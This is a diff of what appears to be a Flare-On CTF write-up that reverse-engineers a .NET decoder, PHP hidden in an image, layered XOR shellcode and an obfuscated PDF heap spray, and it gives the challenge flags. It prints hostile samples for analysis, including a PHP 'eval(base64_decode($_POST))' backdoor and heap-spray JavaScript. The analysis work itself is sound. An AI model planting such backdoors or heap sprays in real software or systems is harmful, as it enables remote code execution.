@@ -13,28 +13,13 @@ You can download the relevant files on this page:
 
 Hashes of the archive (`C1.zip`) containing the files of the challenge:
 
-<!--kg-card-begin: html--><table>
-<thead>
-<tr>
-<th>Hash</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>MD5</td>
-<td>7094c69959f626f8078145ab75abbbd0</td>
-</tr>
-<tr>
-<td>SHA1</td>
-<td>0e5895e65fe0f50275047bfb033ed272728ad4eb</td>
-</tr>
-<tr>
-<td>SHA256</td>
-<td>038e9ad33a0529337b0b0c30e37ae92787d0f0fb784e4c41cf2f36b020a5542e</td>
-</tr>
-</tbody>
-</table><!--kg-card-end: html-->Once you extract from the `Win32 Cabinet Self-Extractor` (`C1.exe`), you'll find yourself with a Windows executable written in `.NET`.
+| Hash | Value |
+|-|-|
+| MD5 | 7094c69959f626f8078145ab75abbbd0</td>
+| SHA1 | 0e5895e65fe0f50275047bfb033ed272728ad4eb</td>
+| SHA256 | 038e9ad33a0529337b0b0c30e37ae92787d0f0fb784e4c41cf2f36b020a5542e
+
+Once you extract from the `Win32 Cabinet Self-Extractor` (`C1.exe`), you'll find yourself with a Windows executable written in `.NET`.
 
 Opening the binary with `dnSpy`, I noticed the following function:
 
@@ -63,7 +48,6 @@ private void btnDecode_Click(object sender, EventArgs e)
     }
     this.lbl_title.Text = text3;
 }
-
 ```
 
 As you may infer from this code, the function is applied to a button of a GUI program. When the user clicks on the button, this function `btnDecode_Click` is executed.
@@ -78,7 +62,6 @@ foreach (byte b in dat_secret)
 {
     text += (char)((b >> 4 | ((int)b << 4 &amp; 240)) ^ 41);
 }
-
 ```
 
 It seems to retrieve a resource (from the `.rsrc` section) and then performs some bitwise operations on each byte of the resource data.
@@ -104,7 +87,6 @@ encoded_bytes = bytearray.fromhex(encoded)
 decoded_list = [chr((b >> 4 | (b << 4 &amp; 240)) ^ 41) for b in encoded_bytes]
 print("".join(decoded_list))
 # 3rmahg3rd.b0b.d0ge@flare-on.com
-
 ```
 
 I successfully managed to decode it manually!
@@ -113,33 +95,17 @@ I successfully managed to decode it manually!
 
 Hashes of the archive (`C2.zip`) containing the files of the challenge:
 
-<!--kg-card-begin: html--><table>
-<thead>
-<tr>
-<th>Hash</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>MD5</td>
-<td>74ea6bd7a2e19cfd6096614d7d9e8e0f</td>
-</tr>
-<tr>
-<td>SHA1</td>
-<td>32b08a345a4246526e8ecd73cacb8ceef3c32e9e</td>
-</tr>
-<tr>
-<td>SHA256</td>
-<td>407c11647b9c58f41daba5a6b85f04ac2a0c31bab9eefe3362c2805329a59bd1</td>
-</tr>
-</tbody>
-</table><!--kg-card-end: html-->I had some problems extracting the files from the archive `C2.zip`, due the `unzip` not supporting the compression algorithm `PK 5.1`. In the end, I managed to extract it this way:
+| Hash| Value |
+|-|-|
+| MD5 | 74ea6bd7a2e19cfd6096614d7d9e8e0f
+| SHA1 | 32b08a345a4246526e8ecd73cacb8ceef3c32e9e
+| SHA256 | 407c11647b9c58f41daba5a6b85f04ac2a0c31bab9eefe3362c2805329a59bd1
+
+I had some problems extracting the files from the archive `C2.zip`, due the `unzip` not supporting the compression algorithm `PK 5.1`. In the end, I managed to extract it this way:
 
 ```bash
 # password: malware
 7x x C2.zip -ochall_02
-
 ```
 
 Inside, there are two files:
@@ -149,7 +115,6 @@ Inside, there are two files:
 ├── home.html
 └── img
     └── flare-on.png
-
 ```
 
 While the HTML file doesn't contain anything useful, the image `flare-on.png` contains some PHP code, while still being a valid image!
@@ -171,7 +136,6 @@ for ($i = 0; $i < count($order); $i++)
 
 eval($do_me);
 ?>
-
 ```
 
 To de-obfuscate the code, I simply replaced the `eval` function with an `echo`:
@@ -182,7 +146,6 @@ $__ = 'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';
 $___ = "\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";
 
 eval($___($__));
-
 ```
 
 This one is a little more complicated. First, the variable `$___` is the string `base64_decode` encoded to hex/decimal notation.
@@ -192,7 +155,6 @@ Once again, replacing `eval` with `echo` reveals the next block of code:
 ```php
 $code = base64_decode($_);
 eval($code);
-
 ```
 
 Once more:
@@ -202,7 +164,6 @@ if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x
 {
     eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"]));
 }
-
 ```
 
 To decode the two strings, I used some python code:
@@ -215,47 +176,29 @@ l = [97, 49, 49, 68, 0x4F, 84, 116, 0x68, 97, 0x74, 0x44, 0x4F, 0x54, 0x6A, 97, 
 m = [97, 49, 0x31, 68, 0x4F, 0x54, 116, 104, 0x61, 116, 0x44, 79, 0x54, 106, 97, 118, 97, 53, 0x63, 114, 0x61, 0x70, 65, 84, 102, 0x6C, 0x61, 114, 101, 0x44, 65, 0x53, 72, 111, 0x6E, 0x44, 0x4F, 84, 99, 0x6F, 0x6D]
 "".join([chr(x) for x in m])
 # a11DOTthatDOTjava5crapATflareDASHonDOTcom
-
 ```
 
 In both cases, the resulting decoded string is `a11DOTthatDOTjava5crapATflareDASHonDOTcom`, so the flag should be the following:
 
 ```txt
 a11.that.java5crap@flare-on.com
-
 ```
 
 ### Challenge 03
 
 Hashes of the archive (`C3.zip`) containing the files of the challenge:
 
-<!--kg-card-begin: html--><table>
-<thead>
-<tr>
-<th>Hash</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>MD5</td>
-<td>84d6581b485a8580092a20bc614bb660</td>
-</tr>
-<tr>
-<td>SHA1</td>
-<td>06ea4adb5c22b46c8751402cd20ffd73ce72dd4b</td>
-</tr>
-<tr>
-<td>SHA256</td>
-<td>e81a25edd426d9cdcefe5ca06d8ddb21e248100e2f1150dea5834f420b64652b</td>
-</tr>
-</tbody>
-</table><!--kg-card-end: html-->Once extracted, I found a strange file named `such_evil`:
+| Hash | Value |
+|-|-|
+| MD5 | 84d6581b485a8580092a20bc614bb660
+| SHA1 | 06ea4adb5c22b46c8751402cd20ffd73ce72dd4b
+| SHA256 | e81a25edd426d9cdcefe5ca06d8ddb21e248100e2f1150dea5834f420b64652b
+
+Once extracted, I found a strange file named `such_evil`:
 
 ```bash
 file such_evil
 # such_evil:          PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
-
 ```
 
 According to its properties, it's a Windows executable compiled for 32-bit `x86` systems.
@@ -300,7 +243,6 @@ uint32_t entry0 (void) {
     
     return eax;
 }
-
 ```
 
 What caught my interest isn't the first function (`fcn_004025d1`), but the last one: `fcn_00401000`.
@@ -364,18 +306,17 @@ Bases on the following decompiled instructions, it seems to fill a memory area w
 │           0x00402492      8845ff         mov byte [var_1h], al
 │           0x00402495      8d85fffdffff   lea eax, [var_201h]
 │           0x0040249b      ffd0           call eax
-
 ```
 
 Besides the function prologue, and a `nop` instruction, it starts doing the following:
 
-<ol><li>copy the byte `0xe8` to the variable `var_201h`, whose address is equal to **$ebp - 0x201**
-- copy `0x00` to $ebp-0x200
-- copy `0x00` to $ebp-0x1ff
-- copy `0x00` to $ebp-0x1fe
-- copy `0x00` to $ebp-0x1fd
-- copy `0x00` to $ebp-0x1fc
-- copy `0x8b` to $ebp-0x1fb
+1. copy the byte `0xe8` to the variable `var_201h`, whose address is equal to **$ebp - 0x201**
+2. copy `0x00` to $ebp-0x200
+3. copy `0x00` to $ebp-0x1ff
+4. copy `0x00` to $ebp-0x1fe
+5. copy `0x00` to $ebp-0x1fd
+6. copy `0x00` to $ebp-0x1fc
+7. copy `0x8b` to $ebp-0x1fb
 
 At the end of the function, the program loads the address of the local variable `var_201h`, and after that it jumps to that address, by means of the `CALL` instruction.
 
@@ -391,7 +332,6 @@ So far, this program seems to copy some bytes, supposedly shellcode, to the foll
 |--- EBP - 0x003 ---|
 |--- EBP - 0x002 ---|
 +--- EBP - 0x001 ---+
-
 ```
 
 The firs byte starts at the address `$EBP-0x201`, and the last on is stored at `$EBP-1`.
@@ -400,7 +340,6 @@ To extract this shellcode, I simply used some `bash magic`:
 
 ```bash
 xxd -p such_evil | tr -d '\n' | grep -oE 'b8[a-f0-9]{2}000000' | tail +2 | head -n 513 | sed -E 's/b8(..)000000/\1/g' | tr -d '\n' | xxd -r -p > shellcode.bin
-
 ```
 
 Once I extracted the shellcode, I could use `radare2` to analyze the assembly instructions:
@@ -426,7 +365,6 @@ Once I extracted the shellcode, I could use `radare2` to analyze the assembly in
 0x0000002d      010f           add dword [edi], ecx
 0x0000002f      08150e131566   or byte [0x6615130e], dl    ; [0x6615130e:1]=255
 0x00000035      660e           push cs
-
 ```
 
 The instructions up to the offset `0x1c` can be converted to the following pseudo-code:
@@ -457,7 +395,6 @@ void fcn_00000000 () {
 shellcode:
     return void (*0x31)() ();
 }
-
 ```
 
 As you have noticed, the function loops `0x1df` times in order to `XOR` the bytes from the address `0x21` onwards, meaning until the byte `0x200`.
@@ -476,7 +413,6 @@ with open("shellcode.bin", 'rb') as f:
     
     with open("shellcode2.bin", "wb") as f2:
         f2.write(decrypted_shellcode)
-
 ```
 
 I found the string `and so it begins` at the beginning of the decrypted shellcode, which meant I was on the right track. Moreover, it meant the initial bytes must be skipped (being a string), and I needed to find the correct jump:
@@ -484,7 +420,6 @@ I found the string `and so it begins` at the beginning of the decrypted shellcod
 ```cpp
 shellcode:
     return void (*0x31)() ();
-
 ```
 
 Looking back, I remembered the call to the offset `0x31`, exactly `0x10` bytes after the beginning of the decrypted data. Coincidentally, the previous string is 10-characters long, so the real instructions start right after the letter `s` of `begins`.
@@ -495,7 +430,6 @@ Therefore, I tweaked the script a bit in order to obtain the real shellcode:
 # [omissis]
     with open("shellcode2.bin", "wb") as f2:
         f2.write(decrypted_shellcode[0x10:])
-
 ```
 
 Follows the disassembly of the decrypted shellcode:
@@ -540,7 +474,6 @@ Follows the disassembly of the decrypted shellcode:
 0x0000003b      46             inc esi
 0x0000003c      ebeb           jmp 0x29
 0x0000003e      e931000000     jmp 0x74
-
 ```
 
 The instructions above can be converted to the following pseudo-code:
@@ -581,7 +514,6 @@ int32_t fcn_00000000 (void)
     
     // [omissis]
 }
-
 ```
 
 In brief, the program loops over the string `nopasaurus` in order to `XOR-decrypt` the shellcode stored in the range `0x43` to `0x1cf` (0x43 + 0x18c).
@@ -603,7 +535,6 @@ with open("shellcode2.bin", 'rb') as f:
     
     with open("shellcode3.bin", "wb") as f2:
         f2.write(decrypted_shellcode)
-
 ```
 
 Using this script, I managed to decrypt shellcode, and I also found a string left by the authors:
@@ -614,7 +545,6 @@ Using this script, I managed to decrypt shellcode, and I also found a string lef
 # [omissis]
     with open("shellcode3.bin", "wb") as f2:
         f2.write(decrypted_shellcode[0x74 - 0x43:])
-
 ```
 
 Follows the decrypted shellcode:
@@ -634,7 +564,6 @@ Follows the decrypted shellcode:
 0x0000001e      83e904         sub ecx, 4
 0x00000021      ebed           jmp 0x10
 0x00000023      ef             out dx, eax
-
 ```
 
 This one is smaller, although it's becoming repetive: once again it uses the xor operation to decode some shellcode, however this time it does so by xoring 4 bytes at a time with the XOR key `0x476c4f62` (ASCII: `GlOb`).
@@ -655,7 +584,6 @@ with open("shellcode3.bin", 'rb') as f:
             decoded_dword_packed = struct.pack("<i", decoded_dword)
 
             f2.write(decoded_dword_packed)
-
 ```
 
 The decrypted shellcode contains yet another decryption stub:
@@ -718,7 +646,6 @@ The decrypted shellcode contains yet another decryption stub:
 
 ; first encrypted byte
 0x00000062      1c18           sbb al, 0x18
-
 ```
 
 Using the script below, I successfully decrypted the encrypted shellcode:
@@ -734,7 +661,6 @@ with open("shellcode4.bin", 'rb') as f:
             decrypted_byte = encrypted_shellcode[x] ^ ord(xor_key_bytes[x % len(xor_key_bytes)])
 
             f2.write(chr(decrypted_byte).encode())
-
 ```
 
 As before, the first bytes aren't assembly instructions, but a string left by the author of the challenge:
@@ -743,7 +669,6 @@ As before, the first bytes aren't assembly instructions, but a string left by th
 xxd shellcode5.bin          
 # 00000000: 7375 6368 2e35 6833 3131 3031 3031 3031  such.5h311010101
 # 00000010: 4066 6c61 7265 2d6f 6e2e 636f 6d68 6e74  @flare-on.comhnt
-
 ```
 
 As you can clearly see, the flag for this challenge is `such.5h311010101@flare-on.co`.
@@ -799,7 +724,6 @@ The rest of the shellcode prints the message `aaaaaand i'm spent`:
 ; encrypted bytes (garbage)
 0x00000048      50             push eax
 0x00000049      b3d3           mov bl, 0xd3                ; 211
-
 ```
 
 To decrypt it:
@@ -817,7 +741,6 @@ with open("shellcode5.bin", 'rb') as f:
 
     with open("shellcode6.bin", "wb") as f2:
         f2.write(decrypted_shellcode)
-
 ```
 
 This shellcode is the last one. While it was more complicated than the previous ones, and I already found the flag, I chose to analyze it anyway to improve my skills:
@@ -943,7 +866,6 @@ This shellcode is the last one. While it was more complicated than the previous 
 
 ; call function kernel32.FatalAppExitA
 0x0000006f      ffd7           call edi
-
 ```
 
 Overall, the shellcode runs the following code:
@@ -953,7 +875,6 @@ FatalAppExitA(
     0,
     " BrokenByte"
 );
-
 ```
 
 So it calls the function `FatalAppExitA` to terminate the program and show the message `BrokenByte`.
@@ -1053,7 +974,6 @@ function stalk()
 }
 
 stalk()
-
 ```
 
 After that, you can run it like this:
@@ -1061,7 +981,6 @@ After that, you can run it like this:
 ```ps1
 frida -l script.js .\such_evil.exe
 # %resume
-
 ```
 
 In my case, it found the pattern at the address `0x19fe6a`, as shown below:
@@ -1073,7 +992,6 @@ In my case, it found the pattern at the address `0x19fe6a`, as shown below:
 00000010  68 2e 35 68 33 31 31 30 31 30 31 30 31 40 66 6c  h.5h311010101@fl
 00000020  61 72 65 2d 6f 6e 2e 63 6f 6d 68 6e 74 00 00 68  are-on.comhnt..h
 00000030  20 73 70 65 68 20 69 27 6d 68 61 61               speh i'mhaa
-
 ```
 
 Some references I found very useful for this challenge, in particular for the PEB and its fields:
@@ -1091,7 +1009,6 @@ To extract information from the document, I used a linux program named `dumppdf`
 # With -t option, the decompressed contents are dumped in a text format
 # With -a options, the program dumps all the objects
 dumppdf -t -a APT9001.pdf
-
 ```
 
 Thanks to it, I found the following obfuscated `PostScript` code, which initially contained some HTML entities I decoded using `cyberchef`:
@@ -1133,7 +1050,6 @@ while(QCZabMzxQiD.length+bGtvKT < 0x40000) QCZabMzxQiD = QCZabMzxQiD+QCZabMzxQiD
 FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE = new Array();
 
 for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<125;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = QCZabMzxQiD + zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
-
 ```
 
 Due to the level of obfuscation, I tried to debofuscate it manually:
@@ -1194,11 +1110,10 @@ while(var14.length + var12 < 0x40000)
 
 var15 = new Array();
 
-for (i=0;i<125;i++)
+for (i=0; i<125; i++)
 {
     var15[i] = var14 + var2;
 }
-
 ```
 
 The most important part is the contents of the variable `var3`, which should be some malicious shellcode.
@@ -1212,4 +1127,3 @@ Some references I found useful for this challenge:
 ### Challenge 06
 
 ### Challenge 07
-
